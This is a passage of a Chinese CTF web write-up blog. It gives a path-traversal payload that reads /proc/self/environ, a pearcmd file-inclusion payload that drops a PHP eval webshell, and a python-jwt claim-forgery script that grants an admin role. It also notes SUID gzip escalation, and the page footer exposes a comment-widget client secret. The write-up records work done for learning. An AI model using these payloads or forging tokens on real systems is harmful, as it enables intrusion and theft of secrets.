class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../../runtime.config.json&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Res</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/response&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FileSignUtil</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/file-signature&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DriveUtil</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/database.utilities&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; verifySession &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="variable language_">global</span>.<span class="property">logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span></span></span><br><span class="line"><span class="comment"> * ! <span class="doctag">FIXME:</span> 发现漏洞，请进行修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/s/:hashfn&quot;</span>, <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> hash_fn = <span class="title class_">String</span>(ctx.<span class="property">params</span>.<span class="property">hashfn</span> || <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> hash = hash_fn.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">const</span> from_uid = ctx.<span class="property">query</span>.<span class="property">from_uid</span></span><br><span class="line">    <span class="keyword">const</span> custom_fn = ctx.<span class="property">query</span>.<span class="property">fn</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> hash_fn !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> from_uid !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// invalid params or query</span></span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Invalid Params&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">400</span>; <span class="comment">// Bad Request</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否为共享的文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST</span> = <span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">isShareFileExist</span>(hash, from_uid)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST</span>) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;File Not Found&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">404</span>; <span class="comment">// Not Found</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 系统中是否存储有该文件</span></span><br><span class="line">    </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span>) &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`File <span class="subst">$&#123;hash_fn.yellow&#125;</span> not found in storage, but exist in database!`</span>)</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件名处理</span></span><br><span class="line">    <span class="keyword">let</span> filename = <span class="keyword">typeof</span> custom_fn === <span class="string">&quot;string&quot;</span> ? custom_fn : (<span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">getFilename</span>(from_uid, hash));</span><br><span class="line">    filename = filename.<span class="title function_">replace</span>(<span class="regexp">/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送</span></span><br><span class="line">    ctx.<span class="title function_">set</span>(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">`attachment; filename*=UTF-8&#x27;&#x27;<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(filename)&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span></span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn)).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`Error while sending file <span class="subst">$&#123;hash_fn.yellow&#125;</span>`</span>)</span><br><span class="line">        logger.<span class="title function_">error</span>(e)</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>这里就稍稍寄了 由于js题目做的少 看js代码逻辑很吃力 最后还是折磨出题师傅出的qwq</p>
<p>hash_fn是整个文件的hash</p>
<p>hash取了hash_fn前64个字符校验是否是分享的文件 如果是则会将文件内容读出来</p>
<p>但是问题出在了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span> = fs.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(</span><br><span class="line">            , hash_fn))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>它校验时是否为分享文件取的是hash 但是读文件是通过hash_fn</p>
<p>那么我们可以让前64个hash值为任意分享的文件hash值 之后的内容为<code>../../../../../proc/self/environ</code> 就可以将内容读出来</p>
<p>payload：<code>/s/任意分享文件的hash值/../../../../../proc/self/environ?from_uid=100000&amp;fn=/proc/self/environ</code> 记得要url编码 不然会混淆导致重定向到主页&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<h2 id="4-复盘-未解出"><a href="#4-复盘-未解出" class="headerlink" title="4-复盘(未解出)"></a>4-复盘(未解出)</h2><p>原来这个题考pearcmd啊🤔 跟着官方wp学习</p>
<p>index.php关键代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php </span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_">isset</span>($_GET[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">         $page =<span class="string">&#x27;pages/&#x27;</span> .<span class="property">$_GET</span>[<span class="string">&#x27;page&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $page = <span class="string">&#x27;pages/dashboard.php&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_">file_exists</span>($page)) &#123;</span><br><span class="line">         require_once $page; </span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         require_once <span class="string">&#x27;pages/error_page.php&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>存在文件包含 然后就直接payload🤔🤔</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?+config-create+/&amp;page=/../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[x])?&gt;+/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<p>之后是一个suid提权 gzip的</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698838298382-580e4d6d-f28d-40e7-a0e4-00f6420608e6.png" alt="img"></p>
<p>🤔🤔  </p>
<h2 id="Ye’s-Pickle（未解出"><a href="#Ye’s-Pickle（未解出" class="headerlink" title="Ye’s Pickle（未解出)"></a>Ye’s Pickle（未解出)</h2><p>找到原题了 不敢实践。。。rz 原题是祥云杯2022 的FunWEB</p>
<p>考点：</p>
<ul>
<li>jwt伪造</li>
<li>pickle反序列化</li>
</ul>
<p>源码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># -*- <span class="attr">coding</span>: utf-<span class="number">8</span> -*-</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.<span class="property">jwk</span> <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">generate_random_string</span>(length=<span class="number">16</span>):</span><br><span class="line">    characters = string.<span class="property">ascii_letters</span> + string.<span class="property">digits</span>  # 包含字母和数字</span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.<span class="title function_">join</span>(random.<span class="title function_">choice</span>(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.<span class="property">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="title function_">generate_random_string</span>(<span class="number">16</span>)</span><br><span class="line">key = jwk.<span class="property">JWK</span>.<span class="title function_">generate</span>(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    payload=request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">payload</span>:</span><br><span class="line">        token=<span class="title function_">verify_jwt</span>(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = <span class="title function_">generate_jwt</span>(user, key, <span class="string">&#x27;PS256&#x27;</span>, <span class="title function_">timedelta</span>(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/pickle&quot;</span>)</span><br><span class="line">def <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.<span class="title function_">loads</span>(base64.<span class="title function_">b64decode</span>(request.<span class="property">args</span>.<span class="title function_">get</span>(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_">run</span>(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="title class_">True</span>)</span><br></pre></td></tr></table></figure>

<p>简单审计 可以看到我们的role为admin时 我们才能进行pickle反序列化利用</p>
<p>题中鉴权是靠jwt来实现的 那么生成过程是 </p>
<p>如果get获取到token 那么jwt中<code>session[&quot;role&quot;]</code>就为我们输入token的role </p>
<p>如果token为空 那么他会帮我自动生成jwt 并且将<code>session[&quot;role&quot;]</code>初始化为guest</p>
<p>然后是jwt crack的一个新出的漏洞 这里jwt加密是靠rsa加密 </p>
<p>利用这个脚本 可以不需要公私钥就可以伪造jwt</p>
<p>项目地址：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9">https://github.com/davedoesdev/python-jwt/commit/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9</a></p>
<p>简单修改一下 把里面改为<code>parsed_payload[&#39;role&#39;] = &#39;admin&#39;</code> 即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot; Test claim forgery vulnerability fix &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line">#<span class="keyword">from</span> test.<span class="property">common</span> <span class="keyword">import</span> generated_keys</span><br><span class="line">#<span class="keyword">from</span> test <span class="keyword">import</span> python_jwt <span class="keyword">as</span> jwt</span><br><span class="line"><span class="keyword">from</span> pyvows <span class="keyword">import</span> <span class="title class_">Vows</span>, expect</span><br><span class="line"><span class="keyword">from</span> jwcrypto.<span class="property">common</span> <span class="keyword">import</span> base64url_decode, base64url_encode</span><br><span class="line">def <span class="title function_">topic</span>(topic):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = <span class="title function_">loads</span>(<span class="title function_">base64url_decode</span>(payload))</span><br><span class="line">    parsed_payload[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    fake_payload = <span class="title function_">base64url_encode</span>((<span class="title function_">dumps</span>(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">token=<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTg3NzA4MzAsImlhdCI6MTY5ODc2NzIzMCwianRpIjoiaVNzT2pQOVlLZ1NOUHVqYU5wYWkyQSIsIm5iZiI6MTY5ODc2NzIzMCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.WxTnJPgzKgjBYQ8HB8Ny5W4ZLNpsjAKsikMXHhtIQ-e5MiJp8jSt7AwKcuGsrqsFlTYeJLuGyLaxGGC29PAsKS8SVM82BG0W79nK35mp4aLXIEjer-cRT4GO8LX-WVZ0rRJZuv2Pe8ETPi8Rz0UahtmPYm7BbuvQ3XOudkb--wdcUrSIm2354RvaISRA7Z4a8VuP77VgkBIFNoebO_3c2wTO_w79-hTqg-JbUJqagqeFj5ptroo1SiYHpy2u2zUPKNqEeC6kcKwkZQWNUBGY4BuceLuoGBs9x2DWkAAsgrMC9PcUJ-8zzNFaZF22KxGgiLBv2pjR7HneVrF0Utx4gA&#x27;</span></span><br><span class="line">payload = <span class="title function_">topic</span>(token)</span><br><span class="line"><span class="title function_">print</span>(payload)</span><br></pre></td></tr></table></figure>

<p>之后就是一个很简单的pickle反序列化了 不再赘述</p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>一起共勉</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698564198569-1243af25-92dd-4cfc-916d-4750a52577a3.png" alt="img"></p>

                    </article>
                    


    <blockquote id="date-expire-notification" class="post-expired-notify">本文最后更新于 <span id="date-expire-num"></span> 天前，文中所描述的信息可能已发生改变</blockquote>
    <script>
    (function() {
        var dateUpdate = Date.parse("2023-11-05");
        var nowDate = new Date();
        var a = nowDate.getTime();
        var b = a - dateUpdate;
        var daysUpdateExpire = Math.floor(b/(24*3600*1000));
        if (daysUpdateExpire >= 120) {
            document.getElementById('date-expire-num').innerHTML = daysUpdateExpire;
        } else {
            document.getElementById('date-expire-notification').style.display = 'none';
        }
    })();
    </script>


<p class="post-footer-info mb-0 pt-0">本文发表于&nbsp;<time datetime="2023-11-01T11:33:46.000Z" itemprop="datePublished">2023-11-01</time>

    , 最后修改于&nbsp;<time datetime="2023-11-05T14:31:22.719Z" itemprop="dateModified">2023-11-05</time>

</p>
<p class="post-footer-info mb-0 pt-2">

<span class="post-categories-list mt-2">

<a class="post-categories-list-item" href='/categories/%E5%90%84%E8%B5%9B%E4%BA%8BWP/'>各赛事WP</a>

</span>




</p>

                </div>
                <div class="post-nav px-2 bg-gray">
<ul class="pagination">
    <!-- Prev Nav -->
    
        <li class="page-item page-prev">
            <a href="/post/60ce7176.html" rel="prev">
                <div class="page-item-title"><i class="icon icon-back" aria-hidden="true"></i></div>
                <div class="page-item-subtitle">Thinkphp5.0.x~5.2.x版本反序列化链挖掘学习</div>
            </a>
        </li>
    

    <!-- Next Nav -->
    
        <li class="page-item page-next">
            <a href="/post/cb61c260.html" rel="next">
                <div class="page-item-title"><i class="icon icon-forward" aria-hidden="true"></i></div>
                <div class="page-item-subtitle">SHCTF-校外赛道 WEB WP</div>
            </a>
        </li>
    
</ul>
</div>

                
                    <!-- # Comment # -->
                    
                        <div class="card-footer post-comment">
                            <!-- Gitalk Container -->
<div id="gitalk-container"></div>

<link rel="preload" href="https://cdn.jsdelivr.net/npm/gitalk@1.3.3/dist/gitalk.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.3.3/dist/gitalk.min.css"></noscript>

<script src="https://cdn.jsdelivr.net/npm/gitalk@1.3.3/dist/gitalk.min.js"></script>

<script>
    var gitalk = new Gitalk({
            clientID: 'c9dd41fa890386350257',
            clientSecret: 'c78f6b60a410862c2dcc596f09db2f0c06f025c6',
            repo: 'Z1d10t.github.io',
            owner: 'Z1d10t',
            admin: ['Z1d10t'],
            // facebook-like distraction free mode
            distractionFreeMode: false,
            id: window.location.pathname
        })
   gitalk.render('gitalk-container')
</script>
                        </div>
                    
                
            </div>
        </div>
    </div>
</div>

            <!-- ### Footer ### -->
            <footer class="text-center">
    <!-- footer copyright -->
    
        <p class="footer-copyright mb-0">Copyright&nbsp;©&nbsp;<span id="copyright-year"></span>
            <a class="footer-copyright-a" href="https://z1d10t.fun">Z1d10tのBlog</a>
        </p>

    <!-- footer custom text -->
    <p class="footer-text mb-0">
    
    </p>
    <!-- footer develop info -->
    <p class="footer-develop mb-0">
        

        
        Powered by&nbsp;<!--
         --><a href="https://hexo.io" target="_blank" class="footer-develop-a" rel="external nofollow noopener noreferrer">Hexo</a><span class="footer-develop-divider"></span>Theme&nbsp;-&nbsp;<!--
         --><a href="https://github.com/SukkaW/hexo-theme-suka" target="_blank" class="footer-develop-a" rel="external noopener">Suka</a>
    </p>
</footer>


        <!-- ### Import File ### -->
        <!-- ### Footer JS Import ### -->

<script>

    
window.lazyLoadOptions = {
    elements_selector: ".lazyload",
    threshold: 50
};
document.getElementById('copyright-year').textContent = new Date().getFullYear();
console.log('\n %c Suka Theme (hexo-theme-suka) | © SukkaW | Verision 1.3.3 %c https://github.com/SukkaW/hexo-theme-suka \n', 'color: #fff; background: #444; padding:5px 0;', 'background: #bbb; padding:5px 0;');

</script>

<script src="/lib/vanilla-lazyload/lazyload.min.js" async></script>



<!-- Comment -->

    
        <!-- GitTalk -->
    


<!-- ### Custom Footer ### -->

    </body>

</html>